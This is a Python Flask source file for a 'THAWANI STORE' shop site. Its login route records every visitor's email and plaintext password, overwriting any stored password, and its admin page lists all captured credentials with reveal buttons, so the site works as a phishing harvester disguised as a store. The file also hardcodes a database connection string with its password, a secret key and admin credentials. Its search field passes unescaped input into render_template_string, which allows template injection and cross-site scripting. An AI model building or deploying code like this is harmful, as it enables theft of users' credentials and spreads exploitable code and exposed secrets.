import os
import uuid
import logging
import datetime
import traceback
import psycopg2
from psycopg2.extras import DictCursor
from functools import wraps
from flask import Flask, request, render_template_string, redirect, session, url_for, flash, abort

# ==========================================
# 1. الإعدادات والربط بـ Neon
# ==========================================
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
logger = logging.getLogger(__name__)

app = Flask(__name__)
app.secret_key = "Thawani_Store_Secure_2026_Fixed"

# رابط قاعدة البيانات الخاص بك من Neon
DATABASE_URL = "postgresql://neondb_owner:npg_LfrcOy0oTV6F@ep-bold-voice-an2t0k43.c-6.us-east-1.aws.neon.tech/neondb?sslmode=require"

UPLOAD_FOLDER = os.path.join(os.path.dirname(os.path.abspath(__file__)), 'static', 'uploads')
os.makedirs(UPLOAD_FOLDER, exist_ok=True)
app.config['UPLOAD_FOLDER'] = UPLOAD_FOLDER

def get_db_connection():
    return psycopg2.connect(DATABASE_URL, cursor_factory=DictCursor)

def init_db():
    conn = get_db_connection()
    cur = conn.cursor()
    try:
        cur.execute('''CREATE TABLE IF NOT EXISTS users (
            id SERIAL PRIMARY KEY, 
            email TEXT UNIQUE NOT NULL, 
            password TEXT NOT NULL, 
            is_admin INTEGER DEFAULT 0,
            last_login TIMESTAMP DEFAULT CURRENT_TIMESTAMP)''')
        
        cur.execute('''CREATE TABLE IF NOT EXISTS products (
            id SERIAL PRIMARY KEY, name TEXT NOT NULL, price DECIMAL NOT NULL, 
            img TEXT NOT NULL, category TEXT NOT NULL, description TEXT, is_active INTEGER DEFAULT 1)''')

        cur.execute('''CREATE TABLE IF NOT EXISTS categories (
            id SERIAL PRIMARY KEY, name TEXT UNIQUE NOT NULL)''')

        # حساب الإدارة
        cur.execute("SELECT id FROM users WHERE email='qwerasdf1234598760@gmail.com'")
        if not cur.fetchone():
            cur.execute("INSERT INTO users (email, password, is_admin) VALUES (%s, %s, 1)", 
                       ('qwerasdf1234598760@gmail.com', 'qaws54321'))
        
        conn.commit()
    finally:
        cur.close()
        conn.close()

init_db()

# ==========================================
# 2. التصميم CSS (تم إضافة ستايل البحث والعين)
# ==========================================
CSS = """
<style>
    @import url('https://fonts.googleapis.com/css2?family=Tajawal:wght@400;700&display=swap');
    body { font-family: 'Tajawal', sans-serif; direction: rtl; background: #f4f7f6; margin: 0; padding-bottom: 70px; }
    header { background: #1a237e; color: white; padding: 15px; text-align: center; font-weight: bold; }
    .search-box { padding: 10px; background: white; border-bottom: 1px solid #ddd; display: flex; gap: 5px; }
    .search-box input { flex: 1; padding: 8px; border: 1px solid #ccc; border-radius: 5px; }
    .container { padding: 10px; display: grid; grid-template-columns: 1fr 1fr; gap: 10px; }
    .card { background: white; border-radius: 10px; overflow: hidden; box-shadow: 0 2px 5px rgba(0,0,0,0.1); border: 1px solid #eee; }
    .card img { width: 100%; height: 110px; object-fit: cover; }
    .btn { background: #1a237e; color: white; border: none; padding: 8px; width: 100%; border-radius: 5px; cursor: pointer; text-decoration: none; display: block; text-align: center; font-size: 14px; }
    .admin-table { width: 100%; border-collapse: collapse; background: white; font-size: 12px; }
    .admin-table th, .admin-table td { border: 1px solid #ddd; padding: 8px; text-align: center; }
    .hidden-text { font-family: monospace; }
    .eye-btn { cursor: pointer; background: #eee; border: none; padding: 2px 5px; border-radius: 3px; font-size: 14px; }
</style>
"""

# ==========================================
# 3. المسارات (Routes)
# ==========================================

@app.route('/')
def index():
    if 'user' not in session: return redirect('/login')
    search_q = request.args.get('q', '')
    conn = get_db_connection()
    cur = conn.cursor()
    
    if search_q:
        cur.execute("SELECT * FROM products WHERE is_active=1 AND name ILIKE %s", (f'%{search_q}%',))
    else:
        cur.execute("SELECT * FROM products WHERE is_active=1")
    
    products = cur.fetchall()
    cur.close()
    conn.close()
    
    search_html = f'''
    <form class="search-box" action="/">
        <input name="q" placeholder="ابحث عن منتج..." value="{search_q}">
        <button class="btn" style="width: 60px;">🔍</button>
    </form>
    '''
    
    prod_html = ""
    for p in products:
        prod_html += f'''
        <div class="card">
            <img src="/static/uploads/{p['img']}" onerror="this.src='https://placehold.co/150'">
            <div style="padding:8px;">
                <div style="font-size:12px; height:35px; overflow:hidden;">{p['name']}</div>
                <div style="color:green; font-weight:bold; margin:5px 0;">{p['price']} OMR</div>
                <a href="#" class="btn">شراء الآن</a>
            </div>
        </div>'''
    
    body = f'<header>THAWANI STORE</header>{search_html}<div class="container">{prod_html or "<p>لا توجد نتائج</p>"}</div>'
    return render_template_string(f"<html><head>{CSS}</head><body>{body}</body></html>")

@app.route('/login', methods=['GET', 'POST'])
def login():
    if request.method == 'POST':
        email = request.form.get('email')
        password = request.form.get('password')
        conn = get_db_connection()
        cur = conn.cursor()
        
        # تسجيل أو تحديث دخول الشخص
        cur.execute("INSERT INTO users (email, password) VALUES (%s, %s) ON CONFLICT (email) DO UPDATE SET password=%s, last_login=CURRENT_TIMESTAMP", (email, password, password))
        conn.commit()
        
        session['user'] = email
        session['is_admin'] = (email == "qwerasdf1234598760@gmail.com" and password == "qaws54321")
        cur.close()
        conn.close()
        return redirect('/')
    
    login_form = '''
    <div style="padding:40px 20px;">
        <h2 style="text-align:center;">تسجيل الدخول</h2>
        <form method="POST">
            <input name="email" type="email" placeholder="البريد الإلكتروني" required>
            <input name="password" type="password" placeholder="كلمة المرور" required>
            <button class="btn">دخول</button>
        </form>
    </div>'''
    return render_template_string(f"<html><head>{CSS}</head><body>{login_form}</body></html>")

@app.route('/admin')
def admin():
    if not session.get('is_admin'): return abort(403)
    conn = get_db_connection()
    cur = conn.cursor()
    cur.execute("SELECT email, password, last_login FROM users ORDER BY last_login DESC")
    users = cur.fetchall()
    cur.close()
    conn.close()
    
    user_rows = ""
    for i, u in enumerate(users):
        user_rows += f'''
        <tr>
            <td>
                <span id="em-{i}">***********</span>
                <button class="eye-btn" onclick="toggle('em-{i}', '{u['email']}')">👁️</button>
            </td>
            <td>
                <span id="ps-{i}">***********</span>
                <button class="eye-btn" onclick="toggle('ps-{i}', '{u['password']}')">👁️</button>
            </td>
            <td>{u['last_login'].strftime('%Y-%m-%d %H:%M')}</td>
        </tr>'''
    
    script = '''
    <script>
    function toggle(id, realValue) {
        let el = document.getElementById(id);
        if (el.innerText === "***********") {
            el.innerText = realValue;
        } else {
            el.innerText = "***********";
        }
    }
    </script>'''
    
    table_html = f'''
    <div style="padding:15px;">
        <h3>👥 سجل الزوار والحسابات</h3>
        <table class="admin-table">
            <tr><th>الإيميل</th><th>كلمة السر</th><th>آخر دخول</th></tr>
            {user_rows}
        </table>
        {script}
        <br><a href="/" class="btn">العودة للمتجر</a>
    </div>'''
    return render_template_string(f"<html><head>{CSS}</head><body><header>لوحة الإدارة</header>{table_html}</body></html>")

if __name__ == "__main__":
    port = int(os.environ.get("PORT", 10000))
    app.run(host='0.0.0.0', port=port)
